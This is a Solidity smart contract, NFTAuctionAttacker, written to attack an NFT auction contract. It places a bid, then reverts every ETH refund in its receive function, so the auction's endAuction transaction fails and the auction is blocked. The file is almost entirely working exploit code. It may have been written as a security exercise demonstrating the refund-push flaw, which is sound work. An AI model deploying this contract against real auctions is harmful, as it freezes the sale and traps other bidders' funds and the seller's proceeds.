// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

// The auction contract interface
    interface INFTAuction {
        function bid() external payable;
        function withdraw() external returns (bool);
}

/**
 * @title NFTAuctionAttacker
 * @notice This contract is designed to attack the NFTAuction by blocking its endAuction function
 *         - It places a bid through the attack function
 *         - It rejects incoming ETH transfers in its receive function
 *         - This prevents the NFTAuction from refunding this bidders when endAuction is called
 */
contract NFTAuctionAttacker {
    // Error for rejection
    error RejectPayment();
    
    // The NFT auction contract to attack
    INFTAuction public nftAuction;
    
    constructor(address _nftAuction) {
        nftAuction = INFTAuction(_nftAuction);
    }
    
    // Function to place a bid on the auction
    function attack() external payable {
        nftAuction.bid{value: msg.value}();
    }
    
    // This function will revert when the auction tries to refund this contract
    // causing the entire endAuction transaction to fail
    receive() external payable {
        revert RejectPayment();
    }
}